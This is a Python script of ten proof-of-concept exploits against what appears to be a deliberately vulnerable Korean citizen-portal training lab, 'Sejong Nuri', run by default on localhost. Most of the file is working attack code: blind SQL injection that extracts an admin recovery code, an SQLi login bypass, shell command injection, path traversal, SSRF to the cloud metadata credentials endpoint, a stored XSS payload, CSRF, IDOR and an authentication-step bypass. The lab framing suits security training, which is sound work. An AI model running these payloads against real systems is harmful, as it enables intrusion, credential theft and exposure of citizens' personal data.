#!/usr/bin/env python3
"""Sejong Nuri JSP training-lab PoCs (S01-S10).

Run only against an assigned Sejong Nuri training instance.
The default target is the local Docker instance on port 11191.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import sys
import uuid
from pathlib import Path
from typing import Any, Callable
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlparse
from urllib.request import HTTPCookieProcessor, Request, build_opener


LAB_USERNAME = "hangaram"
LAB_PASSWORD = "hangaram"
SCRIPT_DIR = Path(__file__).resolve().parent


class PocError(RuntimeError):
    pass


class Client:
    def __init__(self, base_url: str):
        parsed = urlparse(base_url)
        if parsed.scheme not in {"http", "https"} or not parsed.netloc:
            raise PocError("--base-url must be an http(s) URL")
        self.base_url = base_url.rstrip("/") + "/"
        self.cookies = http.cookiejar.CookieJar()
        self.opener = build_opener(HTTPCookieProcessor(self.cookies))

    def request(
        self,
        path: str,
        *,
        method: str = "GET",
        query: dict[str, str] | None = None,
        json_body: dict[str, Any] | None = None,
        body: bytes | None = None,
        headers: dict[str, str] | None = None,
    ) -> tuple[int, dict[str, str], bytes]:
        url = urljoin(self.base_url, path.lstrip("/"))
        if query:
            url += ("&" if "?" in url else "?") + urlencode(query)
        request_headers = {"User-Agent": "sejong-nuri-lab-poc/1.0"}
        request_headers.update(headers or {})
        if json_body is not None:
            body = json.dumps(json_body, ensure_ascii=False).encode("utf-8")
            request_headers["Content-Type"] = "application/json"
        request = Request(url, data=body, headers=request_headers, method=method)
        try:
            with self.opener.open(request, timeout=15) as response:
                return response.status, dict(response.headers.items()), response.read()
        except HTTPError as error:
            return error.code, dict(error.headers.items()), error.read()
        except URLError as error:
            raise PocError(f"request failed: {error}") from error

    def json(self, path: str, **kwargs: Any) -> tuple[int, dict[str, Any]]:
        status, _, body = self.request(path, **kwargs)
        try:
            data = json.loads(body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as error:
            raise PocError(f"expected JSON from {path}, got HTTP {status}") from error
        return status, data

    def login(self, username: str = LAB_USERNAME, password: str = LAB_PASSWORD) -> dict[str, Any]:
        status, data = self.json(
            "/api/citizens/login",
            method="POST",
            json_body={"username": username, "password": password},
        )
        require(status == 200, f"login failed: HTTP {status} {data}")
        return data["user"]

    def multipart_upload(self, filename: str, content_type: str, content: bytes) -> tuple[int, dict[str, Any]]:
        boundary = "----SejongNuriPoc" + uuid.uuid4().hex
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="attachment"; filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n\r\n"
        ).encode("utf-8") + content + f"\r\n--{boundary}--\r\n".encode("ascii")
        return self.json(
            "/api/attachments",
            method="POST",
            body=body,
            headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        )


def require(condition: bool, message: str) -> None:
    if not condition:
        raise PocError(message)


def text(body: bytes) -> str:
    return body.decode("utf-8", errors="replace")


def s01(base_url: str, _: Client) -> str:
    public = Client(base_url)
    _, known = public.json("/api/public/account-check", query={"username": "hangaram"})
    _, unknown = public.json("/api/public/account-check", query={"username": "guest"})
    require(known.get("registered") is True and unknown.get("registered") is False,
            "account enumeration oracle did not distinguish known and unknown users")

    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-"
    recovered = ""
    for position in range(1, 17):
        for guessed in alphabet:
            payload = (
                "admin' AND substr((SELECT recovery_code FROM portal_accounts "
                f"WHERE username='admin'),{position},1)='{guessed}' -- "
            )
            status, data = public.json("/api/public/account-check", query={"username": payload})
            require(status == 200, f"blind SQLi oracle returned HTTP {status}")
            if data.get("registered") is True:
                recovered += guessed
                break
        else:
            break
    require(recovered == "NURI-7342", f"unexpected recovery code: {recovered!r}")

    bypass = Client(base_url)
    status, data = bypass.json(
        "/api/citizens/login",
        method="POST",
        json_body={"username": "admin' -- ", "password": "wrong"},
    )
    require(status == 200 and data.get("user", {}).get("role") == "staff",
            f"login SQLi bypass failed: HTTP {status} {data}")
    return f"account oracle + blind recovery={recovered} + staff login bypass"


def s02(_: str, client: Client) -> str:
    status, data = client.json(
        "/api/service/status/check",
        query={"target": "portal.internal;cat config/service.txt"},
    )
    output = str(data.get("output", ""))
    require(status == 200 and "내부 서비스 점검 메모" in output,
            f"command injection failed: HTTP {status} {data}")
    require(data.get("isolatedTrainingContainer") is True,
            "target did not report the isolated training container")
    return "non-destructive command execution read config/service.txt"


def s03(_: str, client: Client) -> str:
    status, data = client.json(
        "/api/citizens/identity/complete",
        method="POST",
        json_body={"verificationStep": "complete"},
    )
    require(status == 200 and data.get("verified") is True,
            f"identity-step bypass failed: HTTP {status} {data}")
    return "identity verified without an OTP"


def s04(_: str, client: Client) -> str:
    status, data = client.json("/api/applications", query={"receiptNo": "APP-1000"})
    application = data.get("application", {})
    require(status == 200 and application.get("owner_username") == "dajeong",
            f"cross-user complaint read failed: HTTP {status} {data}")
    require(application.get("applicant_phone") == "010-0000-2026",
            "expected training PII was not returned")
    return "hangaram session read dajeong complaint APP-1000"


def s05(_: str, client: Client) -> str:
    status, _, body = client.request(
        "/api/documents/download",
        query={"file": "../../private/operations.txt"},
    )
    content = text(body)
    require(status == 200 and "TRAINING ONLY" in content,
            f"path traversal failed: HTTP {status} {content[:160]!r}")
    return "path traversal read var/private/operations.txt"


def s06(base_url: str, client: Client) -> str:
    payload = (SCRIPT_DIR / "s06-active-upload.html").read_bytes()
    status, data = client.multipart_upload("s06-active-upload.html", "text/html", payload)
    public_url = str(data.get("publicUrl", ""))
    require(status == 201 and public_url.startswith("/uploads/"),
            f"active HTML upload failed: HTTP {status} {data}")
    get_status, headers, uploaded = client.request(public_url)
    require(get_status == 200 and b"s06-upload-executed" in uploaded,
            "uploaded active HTML could not be retrieved")
    require("text/html" in headers.get("Content-Type", ""),
            f"uploaded file was not served as HTML: {headers.get('Content-Type')}")
    return f"active HTML served same-origin at {urljoin(base_url.rstrip('/') + '/', public_url.lstrip('/'))}"


def s07(_: str, client: Client) -> str:
    status, data = client.json(
        "/api/documents/preview",
        query={
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/SejongNuriTrainingRole"
        },
    )
    require(status == 200 and "TRAINING_ONLY_ACCESS_KEY" in str(data.get("body", "")),
            f"metadata SSRF failed: HTTP {status} {data}")
    return "SSRF read simulated instance-role credentials"


def s08(base_url: str, client: Client) -> str:
    payload = '<img src=x onerror="document.documentElement.dataset.s08=\'executed\'">'
    status, created = client.json(
        "/api/board/posts",
        method="POST",
        json_body={"content": payload},
    )
    post_id = created.get("id")
    require(status == 201 and isinstance(post_id, int),
            f"stored XSS payload creation failed: HTTP {status} {created}")
    status, listing = client.json("/api/board/posts")
    require(status == 200 and any(post.get("id") == post_id and post.get("content") == payload
                                  for post in listing.get("posts", [])),
            "stored XSS payload was not returned unchanged")
    return f"stored payload id={post_id}; open {base_url.rstrip('/')}/board and check html[data-s08=executed]"


def s09(base_url: str, client: Client) -> str:
    client.json("/api/citizens/preferences/email", query={"enabled": "true"})
    status, changed = client.json("/api/citizens/preferences/email", query={"enabled": "false"})
    verify_status, verified = client.json("/api/citizens/preferences")
    require(status == 200 and changed.get("emailEnabled") is False,
            f"tokenless GET state change failed: HTTP {status} {changed}")
    require(verify_status == 200 and verified.get("emailEnabled") is False,
            "preference did not remain disabled")
    client.json("/api/citizens/preferences/email", query={"enabled": "true"})
    csrf_file = SCRIPT_DIR / "s09-csrf.html"
    return (
        "tokenless GET changed email preference; restored to true; "
        f"browser payload={csrf_file.name}?portal={base_url.rstrip('/')}"
    )


def s10(_: str, client: Client) -> str:
    pending_status, _, pending_body = client.request("/api/certificates/7001/download")
    other_status, _, other_body = client.request("/api/certificates/7101/download")
    pending = text(pending_body)
    other = text(other_body)
    require(pending_status == 200 and "승인되지 않은 신청 건" in pending,
            "pending certificate was not issued")
    require(other_status == 200 and "김다정" in other and "dajeong" in other,
            "cross-user certificate was not issued")
    return "issued pending certificate 7001 and another user's certificate 7101"


POCS: dict[str, tuple[str, Callable[[str, Client], str]]] = {
    "S01": ("SQL injection", s01),
    "S02": ("OS command injection", s02),
    "S03": ("insufficient authentication", s03),
    "S04": ("insufficient authorization / IDOR", s04),
    "S05": ("file download path traversal", s05),
    "S06": ("active-file upload", s06),
    "S07": ("server-side request forgery", s07),
    "S08": ("stored cross-site scripting", s08),
    "S09": ("cross-site request forgery", s09),
    "S10": ("process validation bypass", s10),
}


def main() -> int:
    parser = argparse.ArgumentParser(description="Run verified PoCs against a Sejong Nuri training instance")
    parser.add_argument("--base-url", default="http://127.0.0.1:11191")
    parser.add_argument("--only", choices=list(POCS), help="run one scenario instead of all scenarios")
    args = parser.parse_args()

    health_client = Client(args.base_url)
    status, health = health_client.json("/api/health")
    require(status == 200 and health.get("trainingMode") is True,
            "target is not a reachable Sejong Nuri training instance")

    selected = [args.only] if args.only else list(POCS)
    citizen = Client(args.base_url)
    if any(code != "S01" for code in selected):
        user = citizen.login()
        require(user.get("username") == LAB_USERNAME, "unexpected lab user after login")

    failures: list[str] = []
    for code in selected:
        title, function = POCS[code]
        try:
            detail = function(args.base_url, citizen)
            print(f"[PASS] {code} {title}: {detail}")
        except Exception as error:  # keep running so the full set reports every failure
            failures.append(code)
            print(f"[FAIL] {code} {title}: {error}", file=sys.stderr)

    if failures:
        print(f"\nFailed: {', '.join(failures)}", file=sys.stderr)
        return 1
    print(f"\nPASS: {len(selected)} PoC(s) reproduced on {args.base_url.rstrip('/')}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except PocError as error:
        print(f"ERROR: {error}", file=sys.stderr)
        raise SystemExit(2)
